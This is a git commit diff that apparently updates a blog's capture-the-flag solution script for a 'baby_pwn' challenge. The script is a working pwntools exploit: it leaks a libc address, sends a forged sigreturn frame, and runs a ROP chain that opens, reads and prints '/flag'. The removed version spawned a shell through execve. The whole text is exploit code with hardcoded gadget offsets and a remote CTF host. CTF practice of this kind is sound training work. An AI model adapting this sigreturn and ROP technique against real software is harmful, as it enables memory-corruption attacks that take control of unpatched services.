aa69610b2c30db059cc4017f57d40c84178da0d5
root <root@localhost.localdomain>
2020-03-01 23:29:00 +0800

    Site updated: 2020-03-01 23:28:59

--- 2020/03/01/Competition/V-N/baby_pwn/exp.py
+++ 2020/03/01/Competition/V-N/baby_pwn/exp.py
@@ -1,19 +1,46 @@
-from pwn import*
-#p = remote('')
-p =process('./babypwn')
-libc = ELF('./libc-2.23.so')
-p.recvuntil('gift: ')
-puts_addr = int(p.recvuntil('\n',drop = True),16)
-libc_base = puts_addr - libc.sym['puts']
-bin_sh = libc_base + 0x18CD57
-syscall_ret = libc_base + 0x1014D7
-ret_addr = 0x7fffffffdf18
-sigframe = SigreturnFrame()
-sigframe.rax = constants.SYS_execve
-sigframe.rdi = bin_sh  # "/bin/sh" 's addr
-sigframe.rsi = 0x0
-sigframe.rdx = 0x0
-sigframe.rsp = ret_addr
-sigframe.rip = syscall_ret
-p.send(sigframe)
+from pwn import *
+p = process("./babypwn")
+p = remote('node3.buuoj.cn',29429)
+libc=ELF("libc-2.23.so")
+p.recvuntil("Here is my gift: ")
+puts_addr = int(p.recvuntil('\n',drop=True),16)
+libc.address = puts_addr - libc.sym['puts']
+p.recvuntil('Please input magic message: ')
+fake_frame  = p64(0) * 12
+fake_frame += p64(0)                                       # RDI = RAX
+fake_frame += p64(0)                                       # RSI = RDI
+fake_frame += p64(0)                                       # RBP
+fake_frame += p64(0)                                       # RBX
+fake_frame += p64(libc.address + 0x3C6500 - 0x10)          # RDX = RSI
+fake_frame += p64(0)                                       # RAX
+fake_frame += p64(0x100)                                   # RCX = RDX
+fake_frame += p64(libc.address + 0x3C6500)                 # RSP
+fake_frame += p64(libc.symbols['syscall'])                 # RIP
+fake_frame += p64(0)                                       # eflags
+fake_frame += p64(0x33)                                    # cs : gs : fs
+fake_frame += p64(0) * 7
+p.send(fake_frame)
+ROP_chain  = '/flag\x00\x00\x00'
+ROP_chain += p64(0)
+ROP_chain += p64(libc.address + 0x0000000000021102)
+ROP_chain += p64(libc.address + 0x3C6500 - 0x10)
+ROP_chain += p64(libc.address + 0x00000000000202E8)
+ROP_chain += p64(0)
+ROP_chain += p64(libc.symbols['open'])
+ROP_chain += p64(libc.address + 0x0000000000021102)
+ROP_chain += p64(3)
+ROP_chain += p64(libc.address + 0x00000000000202E8)
+ROP_chain += p64(libc.address + 0x3C6700)
+ROP_chain += p64(libc.address + 0x0000000000001B92)
+ROP_chain += p64(0x100)
+ROP_chain += p64(libc.symbols['read'])
+ROP_chain += p64(libc.address + 0x0000000000021102)
+ROP_chain += p64(1)
+ROP_chain += p64(libc.address + 0x00000000000202E8)
+ROP_chain += p64(libc.address + 0x3C6700)
+ROP_chain += p64(libc.address + 0x0000000000001B92)
+ROP_chain += p64(0x100)
+ROP_chain += p64(libc.symbols['write'])
+raw_input('>')
+p.send(ROP_chain)
 p.interactive()
